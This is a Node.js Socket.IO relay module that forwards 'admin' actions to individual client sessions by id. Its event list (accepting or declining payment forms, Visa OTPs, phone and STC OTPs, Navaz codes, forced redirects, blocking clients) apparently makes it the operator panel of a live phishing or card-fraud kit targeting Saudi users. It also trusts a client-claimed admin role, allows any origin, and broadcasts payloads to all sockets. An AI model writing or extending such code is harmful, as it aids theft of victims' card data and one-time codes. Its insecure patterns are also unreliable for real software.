// admin-relay.js
// Drop-in Socket.IO relay: forwards admin actions to the target client
// socket by session id. Safe to require from both CJS and ESM (module.exports).
//
// Usage:
//   const { attachAdminRelay } = require("./admin-relay");
//   const io = new Server(httpServer, { cors: { origin: "*" } });
//   attachAdminRelay(io);

const ADMIN_EVENTS = [
  "acceptService", "declineService",
  "acceptPaymentForm", "declinePaymentForm",
  "acceptVisaOtp", "declineVisaOtp",
  "acceptPhone", "declinePhone",
  "acceptPhoneOTP", "declinePhoneOTP",
  "acceptMobOtp", "declineMobOtp",
  "acceptMotslOtp", "declineMotslOtp",
  "acceptStcPhoneOtp", "declineStcPhoneOtp",
  "acceptSTC", "declineSTC",
  "acceptNavaz", "declineNavaz",
  "changeNavazCode",
  "adminRedirect",
  "clientBlocked",
];

function extractId(payload) {
  if (!payload) return null;
  if (typeof payload === "string") return payload;
  if (typeof payload === "object") {
    return payload.id || payload.sessionId || payload._id || null;
  }
  return null;
}

function extractExtra(payload) {
  if (!payload || typeof payload !== "object") return {};
  const { id, sessionId, _id, ...rest } = payload;
  return rest;
}

function attachAdminRelay(io) {
  io.on("connection", (socket) => {
    const role =
      (socket.handshake.auth && socket.handshake.auth.role) ||
      (socket.handshake.query && socket.handshake.query.role) ||
      "client";

    // Auto-join room from handshake if provided.
    const handshakeId =
      (socket.handshake.auth && socket.handshake.auth.id) ||
      (socket.handshake.query && socket.handshake.query.id);
    if (handshakeId) socket.join(String(handshakeId));

    // Allow explicit join events too.
    ["join", "register", "subscribe", "client:join"].forEach((evt) => {
      socket.on(evt, (id) => {
        const sid = typeof id === "string" ? id : extractId(id);
        if (sid) socket.join(String(sid));
      });
    });

    // Admins only: relay every action to the target client's room.
    if (role === "admin") {
      ADMIN_EVENTS.forEach((evt) => {
        socket.on(evt, (payload) => {
          const sid = extractId(payload);
          if (!sid) return;
          const extra = extractExtra(payload);
          const body = Object.keys(extra).length ? extra : undefined;
          // Forward to the customer's socket(s).
          if (body === undefined) io.to(String(sid)).emit(evt);
          else io.to(String(sid)).emit(evt, body);
          // Echo back to admins (existing behavior).
          io.emit("admin:" + evt, payload);
        });
      });
    }
  });
}

module.exports = { attachAdminRelay, ADMIN_EVENTS };
